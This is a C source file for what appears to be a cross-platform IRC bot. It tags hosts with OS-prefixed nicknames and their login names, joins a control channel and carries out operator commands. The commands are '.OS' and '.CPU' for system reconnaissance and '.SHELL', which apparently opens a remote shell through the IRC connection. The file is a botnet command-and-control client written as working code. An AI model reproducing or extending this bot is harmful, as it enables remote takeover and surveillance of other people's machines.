#include "pch.h"
#include "irc.h"
#include "logger.h"
#include "command.h"
#if defined(__linux__) || defined(__APPLE__)
#include "net.h"
#endif

#ifdef _WIN32
void generate_nickname(CHAR *nick) {
#elif defined(__linux__) || defined(__APPLE__)
void generate_nickname(char *nick) {
#endif
	time_t timestamp_sec; /* timestamp in second */
	time(&timestamp_sec);
#ifdef _WIN32
	snprintf(nick, IRC_MAX_USER_SIZE, "W%ld", (long)(timestamp_sec % 10000000));
#elif defined(__linux__)
	snprintf(nick, IRC_MAX_USER_SIZE, "U%ld", timestamp_sec % 10000000);
#elif defined(__APPLE__)
	snprintf(nick, IRC_MAX_USER_SIZE, "X%ld", timestamp_sec % 10000000);
#endif
}

#ifdef _WIN32
void get_username(CHAR *username) {
	DWORD bufCharCount = INFO_BUFFER_SIZE;
	if (!GetUserNameA(username, &bufCharCount)) {
		log_message("Error getting username\n");
		return;
	}
#elif defined(__linux__) || defined(__APPLE__)
void get_username(char *username) {
	getlogin_r(username, LOGIN_NAME_MAX);
#endif
}

#ifdef _WIN32
void generate_username(CHAR *user) {
	CHAR username[INFO_BUFFER_SIZE];
#elif defined(__linux__) || defined(__APPLE__)
void generate_username(char *user) {
	char username[LOGIN_NAME_MAX];
#endif
	get_username(username);
#ifdef _WIN32
	snprintf(user, IRC_MAX_NICKNAME_SIZE, "W-%s\0", username);
#elif defined(__linux__)
	snprintf(user, IRC_MAX_NICKNAME_SIZE, "U-%s", username);
#elif defined(__APPLE__)
	snprintf(user, IRC_MAX_NICKNAME_SIZE, "X-%s", username);
#endif
}

#ifdef _WIN32
void set_nick(int fd, CHAR *nick) {
	CHAR nick_packet[IRC_MAX_MSG_SIZE];
	_snprintf_s(nick_packet, IRC_MAX_MSG_SIZE, _TRUNCATE, "NICK %s\r\n", nick);
#elif defined(__linux__) || defined(__APPLE__)
void set_nick(int fd, char *nick) {
	char nick_packet[IRC_MAX_MSG_SIZE];
	snprintf(nick_packet, IRC_MAX_MSG_SIZE, "NICK %s\r\n", nick);
#endif
	log_message(">>>>>>> %s", nick_packet);
	send_packet(fd, nick_packet, strlen(nick_packet));
}

#ifdef _WIN32
void set_user(int fd, CHAR *user) {
	CHAR user_packet[IRC_MAX_MSG_SIZE];
	snprintf(user_packet, IRC_MAX_MSG_SIZE, "USER %s %s %s :%s\r\n", user, user, user, user);
#elif defined(__linux__) || defined(__APPLE__)
void set_user(int fd, char *user) {
	char user_packet[IRC_MAX_MSG_SIZE];
	snprintf(user_packet, IRC_MAX_MSG_SIZE, "USER %s %s %s :%s\r\n", user, user, user, user);
#endif
	log_message(">>>>>>> %s", user_packet);
	send_packet(fd, user_packet, strlen(user_packet));
}

#ifdef _WIN32
void set_message(int fd, CHAR *message, CHAR *target) {
	CHAR message_packet[IRC_MAX_MSG_SIZE];
	snprintf(message_packet, IRC_MAX_MSG_SIZE, "PRIVMSG %s :%s\r\n", target, message);
#elif defined(__linux__) || defined(__APPLE__)
void set_message(int fd, char *message, char *target) {
	char message_packet[IRC_MAX_MSG_SIZE];
	snprintf(message_packet, IRC_MAX_MSG_SIZE, "PRIVMSG %s :%s\r\n", target, message);
#endif
	log_message(">>>>>>> %s", message_packet);
	send_packet(fd, message_packet, strlen(message_packet));
}

void join_channel(int fd) {
#ifdef _WIN32
	CHAR join_packet[IRC_MAX_MSG_SIZE];
	snprintf(join_packet, IRC_MAX_MSG_SIZE, "JOIN %s\r\n", IRC_CHANNEL);
#elif defined(__linux__) || defined(__APPLE__)
	char join_packet[IRC_MAX_MSG_SIZE];
	snprintf(join_packet, IRC_MAX_MSG_SIZE, "JOIN %s\r\n", IRC_CHANNEL);
#endif
	log_message(">>>>>>> %s", join_packet);
	send_packet(fd, join_packet, strlen(join_packet));
}

#ifdef _WIN32
void pong(int fd, CHAR *data) {
	CHAR pong_packet[IRC_MAX_MSG_SIZE];
	snprintf(pong_packet, IRC_MAX_MSG_SIZE, "PONG %s \r\n", data);
#elif defined(__linux__) || defined(__APPLE__)
void pong(int fd, char *data) {
	char pong_packet[IRC_MAX_MSG_SIZE];
	snprintf(pong_packet, IRC_MAX_MSG_SIZE, "PONG %s \r\n", data);
#endif
	log_message(">>>>>>> %s", pong_packet);
	send_packet(fd, pong_packet, strlen(pong_packet));
}

#ifdef _WIN32
void ping(int fd, CHAR *data) {
	CHAR ping_packet[IRC_MAX_MSG_SIZE];
	snprintf(ping_packet, IRC_MAX_MSG_SIZE, "PING %s \r\n", data);
#elif defined(__linux__) || defined(__APPLE__)
void ping(int fd, char *data) {
	char ping_packet[IRC_MAX_MSG_SIZE];
	snprintf(ping_packet, IRC_MAX_MSG_SIZE, "PING %s \r\n", data);
#endif
	log_message(">>>>>>> %s", ping_packet);
	send_packet(fd, ping_packet, strlen(ping_packet));
}

#ifdef _WIN32
void command_handler_proxy(int fd, CHAR *nickname, CHAR *username, CHAR *target, CHAR *message) {
#elif defined(__linux__) || defined(__APPLE__)
void command_handler_proxy(int fd, char *nickname, char *username, char *target, char *message) {
#endif
	int target_channel = 0;
	if (strncmp(target, "#", 1) == 0) {
		target_channel = 1;
	}
	if (message == NULL || strncmp(message, ".", 1) != 0) {
		return;
	}

	if (strncmp(message, ".HI", 3) == 0) {
		if (target_channel) {
			handle_hello(fd, target);
		}
		else {
			handle_hello(fd, nickname);
		}
	}
	else if (strncmp(message, ".OS", 3) == 0) {
		if (target_channel) {
			handle_os(fd, target);
		}
		else {
			handle_os(fd, nickname);
		}
	}
	else if (strncmp(message, ".CPU", 4) == 0) {
		if (target_channel) {
			handle_cpu(fd, target);
		}
		else {
			handle_cpu(fd, nickname);
		}
	}
	else if (strncmp(message, ".SHELL", 4) == 0) {
		if (target_channel == 0) {
			handle_shell(fd, nickname);
			log_message("finished .SHELL\n");
		}
	}
}

#ifdef _WIN32
void line_handler_proxy(int fd, CHAR *line, size_t line_size) {
#elif defined(__linux__) || defined(__APPLE__)
void line_handler_proxy(int fd, char *line, size_t line_size) {
#endif
	log_message("[(%d)]: %s\n", line_size, line);
	if (strncmp(line, "PING :", 6) == 0) {
		pong(fd, &line[6]);
		return;
	}
	else if (strncmp(line, "NOTICE AUTH :", 13) == 0 || strncmp(line, "ERROR :", 7) == 0) {
		return;
	}
	else if (strncmp(line, ":", 1) == 0) {
#ifdef _WIN32
		char *next_token;
		char *first_token = strtok_s(line, ":", &next_token);
		char *message = strtok_s(NULL, ":", &next_token);
#else
		char *first_token = strtok(line, ":");
		char *message = strtok(NULL, ":");
#endif

#ifdef _WIN32
		char *emitter_token = strtok_s(first_token, " ", &next_token);
		char *command = strtok_s(NULL, " ", &next_token);
		char *first_command_argument = strtok_s(NULL, " ", &next_token);
#else
		char *emitter_token = strtok(first_token, " ");
		char *command = strtok(NULL, " ");
		char *first_command_argument = strtok(NULL, " ");
#endif
		
#ifdef _WIN32
		// Extract nickname and username from emitter
		char *nickname = strtok_s(emitter_token, "!", &next_token);
		char *username_token = strtok_s(NULL, "!", &next_token);
		char *username = strtok_s(username_token, "@", &next_token);
#else
		char *nickname = strtok(emitter_token, "!");
		char *username_token = strtok(NULL, "!");
		char *username = strtok(username_token, "@");
#endif
		// 001 is Welcome code
		if (strncmp(command, "001", 3) == 0) {
			join_channel(fd);
		}
		else if (strncmp(command, "PRIVMSG", 7) == 0) {
			command_handler_proxy(fd, nickname, username, first_command_argument, message);
		}

	}

}
